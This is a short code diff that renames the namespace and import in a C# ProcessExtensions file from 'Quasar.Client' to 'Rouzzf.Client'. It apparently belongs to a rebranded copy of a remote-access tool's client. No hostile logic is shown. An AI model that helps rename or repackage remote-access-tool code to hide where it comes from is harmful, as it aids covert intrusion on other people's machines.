@@ -1,8 +1,8 @@
-﻿using Quasar.Client.Utilities;
+﻿using Rouzzf.Client.Utilities;
 using System.Diagnostics;
 using System.Text;
 
-namespace Quasar.Client.Extensions
+namespace Rouzzf.Client.Extensions
 {
     public static class ProcessExtensions
     {
